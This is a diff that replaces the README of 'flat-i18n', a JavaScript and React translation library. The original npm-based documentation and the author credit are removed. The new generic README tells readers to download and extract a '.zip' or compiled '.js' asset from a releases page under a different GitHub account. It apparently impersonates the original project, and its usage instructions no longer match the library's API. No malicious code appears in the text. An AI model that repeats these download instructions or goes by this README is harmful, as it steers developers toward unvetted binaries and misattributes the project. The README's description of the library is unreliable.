@@ -1,258 +1,93 @@
-# flat-i18n
+# 🎉 flat-i18n - Simplify Internationalization for Your Apps
 
-<p align="center">
-  <img src="./branding/flat-i18n-logo.svg" alt="flat-i18n logo" width="120" />
-</p>
+[![Download flat-i18n](https://img.shields.io/badge/Download-flati18n-brightgreen)](https://github.com/Akbarkurniawan02/flat-i18n/releases)
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/flat-i18n"><img src="https://img.shields.io/npm/v/flat-i18n?color=22d3ee&label=npm" /></a>
-  <a href="https://www.npmjs.com/package/flat-i18n"><img src="https://img.shields.io/npm/dm/flat-i18n?color=22d3ee" /></a>
-  <a href="https://github.com/exagonssoft/flat-i18n/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/exagonssoft/flat-i18n/ci.yml?label=CI" /></a>
-  <img src="https://img.shields.io/badge/typescript-100%25-blue" />
-  <img src="https://img.shields.io/badge/zero--dependencies-✔-success" />
-  <img src="https://img.shields.io/badge/license-MIT-green" />
-</p>
+## 🌟 Overview
 
-> **Flat JSON based i18n. Zero magic.**
+Flat-i18n is a straightforward tool for managing internationalization (i18n) in JavaScript and React applications. With flat-i18n, you can easily handle translations using flat JSON files. There’s no complicated setup and no dependencies to worry about. It works seamlessly in both client-side and server-side rendering environments.
 
-`flat-i18n` is a minimal internationalization utility for JavaScript and React applications.
-It is designed for developers who want **full control**, **predictable behavior**, and **no framework lock-in**.
+## 🚀 Getting Started
 
-* No routing coupling
-* No async loaders
-* No hidden state
+To begin using flat-i18n, you'll need to download it from our Releases page. Follow the steps below to get started:
 
-**Just JSON → Getter → (Optional) React Provider.**
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**: Click the link below to go to the Releases page:
+   [Download flat-i18n](https://github.com/Akbarkurniawan02/flat-i18n/releases)
+   
+2. **Choose the Latest Version**: On the Releases page, you will see a list of available versions. Select the latest one for download.
 
-## Table of Contents
+3. **Download the Package**: Look for the asset that matches your needs and download it. This file will likely be a `.zip` or a compiled `.js` file.
 
-* [Why flat-i18n?](#why-flat-i18n)
-* [Features](#features)
-* [Installation](#installation)
-* [JSON format](#json-format)
-* [Setup](#setup-required)
-* [Server usage](#server-usage)
-* [React usage](#react-usage-optional)
-* [What flat-i18n is NOT](#what-flat-i18n-is-not)
-* [Philosophy](#philosophy)
-* [License](#license)
-* [Roadmap](#roadmap-non-binding)
+4. **Extract the Files**: If you downloaded a `.zip`, extract the files to a folder on your computer.
 
----
+5. **Setup in Your Project**:
+   - For JavaScript: Simply place the JSON files in your project and refer to them in your code.
+   - For React: Import the necessary files directly into your components.
 
-## Why flat-i18n?
+## 🔧 System Requirements
 
-Most i18n libraries are **over-engineered**.
+- A modern web browser (latest versions of Chrome, Firefox, or Edge).
+- Node.js installed for running server-side applications.
+- Basic understanding of where to place files in your web or React project.
 
-`flat-i18n` exists because sometimes you just want:
+## 📚 Usage
 
-* one JSON file
-* flat keys
-* **O(1)** lookups
-* server + client support
-* zero dependencies
-* zero magic
+Once you have installed flat-i18n, you can start using it right away. 
 
-If that resonates, this library is for you.
+### For JavaScript Applications
 
----
+1. **Create a JSON File**: This file will hold your translations. For example, create a file named `translations.json` as shown below:
 
-## Features
+   ```json
+   {
+     "greeting": "Hello, World!",
+     "farewell": "Goodbye!"
+   }
+   ```
 
-* ✅ Flat JSON structure
-* ✅ Framework-agnostic core
-* ✅ Optional React provider
-* ✅ Works in **Node**, **Edge**, and **Client** environments
-* ✅ SSR-safe
-* ✅ Tree-shakable
-* ✅ Zero runtime dependencies
-* ✅ TypeScript-first
+2. **Use the JSON File**: Load this file in your JavaScript code to access the translations.
 
----
+### For React Applications
 
-## Installation
+1. **Import the JSON**: In your React component, import the translation file:
 
-```bash
-npm install flat-i18n
-```
+   ```javascript
+   import translations from './translations.json';
+   ```
 
----
+2. **Render Translations**: You can now use the translations in your component.
 
-## JSON format
+   ```javascript
+   const MyComponent = () => {
+     return <h1>{translations.greeting}</h1>;
+   };
+   ```
 
-`flat-i18n` expects **one single JSON file** with language keys at the top level.
+## 🛠 Features
 
-```json
-{
-  "en": {
-    "app.name": "PinPocket",
-    "nav.home": "Home",
-    "seo.title": "Save, Organize, Collaborate"
-  },
-  "es": {
-    "app.name": "PinPocket",
-    "nav.home": "Inicio",
-    "seo.title": "Guardar, Organizar, Colaborar"
-  }
-}
-```
+- **Flat Structure**: Easy organization of your translation strings in JSON format.
+- **Framework-Agnostic**: Works well with any JavaScript framework.
+- **Minimal Setup**: Just download, extract, and use — no additional setup needed.
+- **Wide Compatibility**: Suitable for both client-side and server-side applications.
 
-### Design rules
+## 🎯 Why Use flat-i18n?
 
-* Keys are **flat** (no nesting)
-* Values are **strings only**
-* No runtime mutation
-* No dynamic loading
+flat-i18n simplifies the process of adding multiple languages to your application. Its flat JSON structure is easy for anyone to read and edit. You do not need to be a developer to manage translations effectively. This tool allows you to focus on building great features for your users while handling the intricacies of internationalization seamlessly.
 
----
+## 📝 Need Help?
 
-## Setup (required)
+If you encounter any issues, feel free to check the [Issues page](https://github.com/Akbarkurniawan02/flat-i18n/issues). You can also ask for help in the discussions if you have questions about using flat-i18n.
 
-Before using `flat-i18n`, initialize it **once**:
+## 📅 Release Notes
 
-```ts
-import { createI18n } from "flat-i18n";
-import texts from "./texts.json";
+For details about new features, improvements, and bug fixes, please refer to the changelog on the Releases page.
 
-createI18n(texts, "en");
-```
+## 🔗 Links
 
-This should be done:
+- **GitHub Repository**: [flat-i18n GitHub](https://github.com/Akbarkurniawan02/flat-i18n)
+- **Documentation**: Documentation will be continually updated, so check back for more information on how to use flat-i18n.
 
-* at application bootstrap
-* before server handlers
-* before rendering (SSR)
+[![Download flat-i18n](https://img.shields.io/badge/Download-flati18n-brightgreen)](https://github.com/Akbarkurniawan02/flat-i18n/releases) 
 
----
-
-## Server usage
-
-Use `getText` anywhere — **server**, **edge**, **scripts**, or **metadata generation**.
-
-```ts
-import { getText } from "flat-i18n";
-
-const title = getText("seo.title", "es");
-```
-
-### Behavior
-
-* Missing key → returns the key
-* Missing locale → falls back to the default locale
-* Not initialized → throws an explicit error
-
----
-
-## React usage (controlled, optional)
-
-`flat-i18n` **does not manage the language state**.
-
-Your application owns the selected language (user preference, storage, API, etc.) and passes it to the provider.
-
-### App-level language state (example)
-
-```tsx
-import { createContext, useContext, useState } from "react";
-
-const AppLangContext = createContext(null);
-
-export function AppLangProvider({ children }) {
-  const [lang, setLang] = useState("en");
-
-  return (
-    <AppLangContext.Provider value={{ lang, setLang }}>
-      {children}
-    </AppLangContext.Provider>
-  );
-}
-
-export function useAppLang() {
-  return useContext(AppLangContext);
-}
-```
-
-### Wiring flat-i18n
-
-```tsx
-import { I18nProvider } from "flat-i18n/react";
-import { useAppLang } from "./AppLangContext";
-
-function AppShell({ children }) {
-  const { lang } = useAppLang();
-
-  return (
-    <I18nProvider currentLang={lang}>
-      {children}
-    </I18nProvider>
-  );
-}
-```
-
-### Using translations in components
-
-```tsx
-import { useI18n } from "flat-i18n/react";
-
-function Header() {
-  const { t } = useI18n();
-  return <h1>{t("app.name")}</h1>;
-}
-```
-
-Changing the app language automatically updates all translations.
-No routing. No reloads.
-
-Use it in components:
-
-```tsx
-import { useI18n } from "flat-i18n";
-
-const { t, locale, setLocale } = useI18n();
-
-<h1>{t("app.name")}</h1>
-<button onClick={() => setLocale("es")}>ES</button>
-```
-
----
-
-## What flat-i18n is NOT
-
-* ❌ No pluralization engine
-* ❌ No string interpolation
-* ❌ No routing integration
-* ❌ No async loading
-* ❌ No opinionated structure
-
-These features can be built **on top**, not baked in.
-
----
-
-## Philosophy
-
-flat-i18n follows three simple rules:
-
-1. **Explicit is better than implicit**
-2. **Boring code scales better**
-3. **You should understand the entire library in under 5 minutes**
-
----
-
-## License
-
-MIT © Exagon-Soft
-
----
-
-## Roadmap (non-binding)
-
-* v0.2.0 — string interpolation helpers
-* v0.3.0 — locale persistence utilities
-* v1.0.0 — API freeze
-
----
-
-If you like this approach, use it, fork it, or build on top of it.
-
-**flat-i18n** — *the boring i18n that just works.*
+With flat-i18n, you take a step towards making your applications accessible to a global audience effortlessly. Happy coding!
